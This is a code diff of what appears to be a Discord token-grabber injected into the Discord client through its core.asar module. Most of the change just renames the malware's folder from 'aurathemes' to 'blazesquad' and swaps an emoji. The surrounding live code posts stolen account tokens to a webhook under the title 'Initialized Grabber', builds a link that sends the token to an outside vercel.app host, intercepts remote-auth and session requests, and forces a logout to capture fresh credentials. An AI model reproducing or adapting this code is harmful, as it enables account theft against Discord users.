@@ -150,7 +150,7 @@ const notify = async (ctx, token, acc) => {
     ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
     ctx.embeds[0].fields.unshift({
-        name: `<a:aura:1087044506542674091> Token:`,
+        name: `:key: Token:`,
         value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
         inline: false
     })
@@ -470,10 +470,10 @@ session.defaultSession.webRequest.onBeforeRequest(
         ],
     },
     (d, callback) => {
-        if (!fs.existsSync(`${__dirname}/aurathemes`))
-            fs.mkdirSync(`${__dirname}/aurathemes`);
-        if (!fs.existsSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
-            fs.writeFileSync(`${__dirname}/aurathemes/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
+        if (!fs.existsSync(`${__dirname}/blazesquad`))
+            fs.mkdirSync(`${__dirname}/blazesquad`);
+        if (!fs.existsSync(`${__dirname}/blazesquad/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
+            fs.writeFileSync(`${__dirname}/blazesquad/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
             execScript(LOGOUT_SCRIPT);
         }
         if (d.url.startsWith("wss://remote-auth-gateway") || d.url.endsWith("auth/sessions"))
@@ -632,6 +632,6 @@ const CREATE_WINDOW_CLIENT = (win) => {
     );
 };
 
-CREATE_WINDOW_CLIENT(BrowserWindow); // INIT
+CREATE_WINDOW_CLIENT(BrowserWindow);
 
 module.exports = require("./core.asar");
